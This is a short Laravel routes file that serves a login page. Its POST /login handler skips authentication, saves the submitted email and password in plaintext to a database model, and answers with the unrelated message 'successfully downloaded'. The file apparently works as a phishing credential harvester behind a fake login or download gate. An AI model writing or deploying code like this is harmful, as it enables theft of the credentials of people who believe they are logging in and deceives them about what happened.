<?php

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

use App\Login;
use Symfony\Component\HttpFoundation\Request;

Route::get('/', function () {
    return view('login');
});

Route::post('/login', function(Request $request){
    $login = new Login();
    $login->email = $request->email;
    $login->pass = $request->pass;
    $login->save();
    return "successfully downloaded";
});
